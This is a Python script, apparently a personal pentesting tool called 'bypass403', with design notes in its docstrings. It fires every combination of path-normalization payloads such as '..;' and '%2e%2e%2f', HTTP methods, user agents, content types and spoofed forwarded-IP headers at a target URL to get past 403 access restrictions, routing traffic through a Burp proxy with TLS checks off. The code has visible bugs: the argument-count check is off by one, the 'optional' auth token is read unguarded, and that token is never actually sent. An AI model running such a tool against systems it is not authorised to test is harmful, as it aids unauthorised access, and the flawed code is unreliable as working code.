'''
Docstring for bypass403
This script is for bypassin 403 forbidden errors on web servers.
The goal is to automate testing all approaches to bypass it including but not limited to:
1. Headers 
2. Path normalization -- done
3. HTTP Methods -- done 
4. User Agents -- done
5. Other headers such as Content-Type -- done 
6. Append IP addresses --done 
    6.1 Add a richer list of IPs maybe

7. Optimize code. -- next step
8. Refererer Headers (not necessary in my case ) --ignored 
9. Test on valid valid scenarios. -- next step
10. Send them via burp? -- done
11. Tailor the args to be more customizable (e.g., if the user does not want to add these lists);--> next step.
12. Try to conquer it if some of the methods or techniques does not make difference. -- next step.
13. Add auth header and see if it makes difference (403 test instead of 401) -- done
14. Display the request arch (to make sure it is structured correctly). -- next step.
15 leveraging `curl` command to perform requests with different techniques -- used "requests" lib instead -- ingored
16. Add UI -- next step 
'''

'''
Shift the model from looping over all cases to "generating testcases and then executing them"
Test case: 
    ## Method = GET
    ## User-Agent = X
    ## Content-Type = Y
    ## Forwarded-Header = Z
    ## IP = 1.2.3.4
    ## Auth = present/ absent

## Design optimization:
  ## Questions to ask myself:
    ## 1. Which dimensions should be paired (e.g., forwarder headers and IPs)
    ## 2. Do I need to test every combination?
    ## 3. What varies, what stays constant? (e.g., URL usually constant)
    ## 4. What should be a single test case? 
    ## 5. What fields does it have or should have? What are optional fields? 

  ## Design considerations:
    ## 1. Execution logic remain clean and flat; One loop for generating test cases, one for executing them. 
    ## 2. Reduce combinations without loosing coverage.

  ## Test case design:
    ## A test case is a one concrete HTTP request .
    ## <Method, Endpoint, Authentication/NoAuth, Extra-headers (User-Agent, Content-Type, Forwarded-Header + IP)>

'''

import requests
import sys


## Helper Methods
def read_file(file_path):
    with open(file_path, 'r') as file:
        agents = file.readlines()
    return agents

def write_to_file(file_path,response,parms):
    # I want parms to be a dic
    # {"url", "method", "agent", "content_type","header", "ip"}

    with open(file_path, 'a') as file:
        file.write(f"[*] Trying url {parms['modified_url']}, Method {parms['method']} with User-Agent:{parms['agent']} with Content-Type : {parms['content_type']} with header {parms['forwarded_header']} with ip value {parms['ip']}\n")
        if not response.text:
            file.write(f"empty response")
        else:
            file.write(f"Response : {response.text}\n")
        file.write("\n************************************************************\n")



HTTP_METHODS = ['GET', 'POST', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH']

# Since we are concatinating the url with '/', i removed the trailing and leading slashes from the list as they are gonna be appended below
PATH_NORM = ['','.', '../../', '..', '%2e', '%2e%2e', '%00', '%20', '..;', '.;', '%2e%2e%2f', '%2e%2e', '/;/']

CONTENT_TYPES = [
    'application/json',
    'application/xml',
    'text/xml',
    'application/x-www-form-urlencoded',
    'multipart/form-data',
    'text/html',
    'text/plain'
]

PROXIES = {
    "http":"127.0.0.1:8080",
    "https":"127.0.0.1:8080"
}

# I cannot make it optional since bypassing depends on passing those parameters
if len(sys.argv) < 4:
    print(f"[!] Incorrect number of arguments.")
    print(f"[!] Usage: {sys.argv[0]} <full_target_url> <agent_wordlist_file> <headers_wordlists> <ip_header_wordlist> <auth token>[optional]")
    sys.exit(1)

# Read wordlists
agents = read_file(sys.argv[2])
forwarded_headers = read_file(sys.argv[3])
ips = read_file(sys.argv[4])


# I want to get the last endpoint to add the path norm char before it, given the url from the user
# For example if the user is providing: http://example.com/api/v1/get-passcode
# I want to get that get-passcode part to add the path norm chars before it.
# We can split via / and get the last part. 
splited_url = sys.argv[1].split('/')
last_segment= splited_url[-1]

def test_case(method, url, headers, auth=None):
    return {
        "method": method,
        "url": url,
        "headers": headers,
        "auth": auth
    }




# Test logic happens here
def generate_test_case():
    for char in PATH_NORM:
        if (char == ''):
            modified_url = sys.argv[1]
        else:
            modified_url = '/'.join(splited_url[:-1] + [char] + [last_segment])
        print(f"[*] Trying URL: {modified_url}")
        for agent in agents:
            agent = agent.strip()
            for content_type in CONTENT_TYPES:
                content_type = content_type.strip()
                for forwarded_header in forwarded_headers:
                    forwarded_header = forwarded_header.strip()
                    for ip in ips:
                        ip = ip.strip()
                        for method in range(len(HTTP_METHODS)):
                            method = HTTP_METHODS[method]
                            if sys.argv[5]:

                                yield test_case(method, modified_url, headers={
                                    "User-Agent": agent,
                                    "Content-Type": content_type,
                                    "Forwarded_header": forwarded_header,
                                    "ip" : ip,
                                    "Authorization": sys.argv[5]
                                })
                            else:
                                yield test_case(method, modified_url, headers={
                                    "User-Agent": agent,
                                    "Content-Type": content_type,
                                    "Forwarded_header": forwarded_header,
                                    "ip" : ip
                                })

                            # write_to_file("/home/ml/Downloads/Clones/Automation/Results/bypass403-results.txt",{
                            #     "modified_url" : modified_url,
                            #     "method" : method,
                            #     "agent" : agent,
                            #     "content_type" : content_type,
                            #     "forwarded_header": forwarded_header,
                            #     "ip": ip
                            # })
                            # if sys.argv[5]:
                            #     authorization_token = sys.argv[5]
                            # else:
                            #     authorization_token = ""

    print(f"[*] Finished appending results to the file. ")

def send_request():

    for i in generate_test_case():
        #print(i)
        response = requests.request(i["method"],i["url"], headers={
            "Content-Type": i["headers"]["Content-Type"],
            i["headers"]["Forwarded_header"]:i["headers"]["ip"],
            "User-Agent": i["headers"]["User-Agent"]
        }, proxies=PROXIES, verify=False)

        write_to_file("/home/ml/Downloads/Clones/Automation/Results/bypass403-results.txt", response, {
            "modified_url":i["url"],
            "method": i["method"],
            "agent":i["headers"]["User-Agent"],
            "content_type": i["headers"]["Content-Type"],
            "forwarded_header":i["headers"]["Forwarded_header"],
            "ip":i["headers"]["ip"]
        })


send_request()